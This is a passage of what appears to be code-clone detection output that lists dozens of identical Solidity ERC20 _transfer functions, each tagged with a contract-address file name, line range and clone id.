    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="107" endline="119" pcid="3330">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="114" endline="126" pcid="6110">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="109" endline="121" pcid="9165">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="108" endline="120" pcid="7935">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="110" endline="122" pcid="7478">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="107" endline="119" pcid="6125">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="104" endline="116" pcid="981">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="107" endline="119" pcid="6587">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="109" endline="121" pcid="1189">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="435" endline="447" pcid="9319">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="108" endline="120" pcid="298">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="111" endline="123" pcid="7523">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="107" endline="119" pcid="6141">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="107" endline="119" pcid="8460">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="111" endline="123" pcid="6572">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="110" endline="122" pcid="313">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="113" endline="125" pcid="3124">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="108" endline="120" pcid="1265">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="112" endline="124" pcid="4007">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="110" endline="122" pcid="4974">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="111" endline="123" pcid="3603">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="110" endline="122" pcid="2294">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="109" endline="121" pcid="554">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="109" endline="121" pcid="3199">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="109" endline="121" pcid="6156">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="110" endline="122" pcid="6171">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="109" endline="121" pcid="6340">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="111" endline="123" pcid="3109">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="113" endline="125" pcid="5113">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="112" endline="124" pcid="2410">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="111" endline="123" pcid="1250">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="113" endline="125" pcid="7347">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="201" endline="213" pcid="623">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="108" endline="120" pcid="840">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="104" endline="116" pcid="6190">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="113" endline="125" pcid="6205">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="111" endline="123" pcid="6220">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="108" endline="120" pcid="4323">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="109" endline="121" pcid="4799">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="108" endline="120" pcid="2771">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="107" endline="119" pcid="7210">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="110" endline="122" pcid="7195">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="111" endline="123" pcid="351">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="111" endline="123" pcid="6235">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="110" endline="122" pcid="8605">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="112" endline="124" pcid="2254">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="112" endline="124" pcid="7866">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="111" endline="123" pcid="3094">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="110" endline="122" pcid="2967">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="109" endline="121" pcid="3064">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="114" endline="126" pcid="569">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="108" endline="120" pcid="7704">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="110" endline="122" pcid="7171">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="109" endline="121" pcid="1227">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="109" endline="121" pcid="6255">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="106" endline="118" pcid="8400">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="108" endline="120" pcid="5098">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="107" endline="119" pcid="4067">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
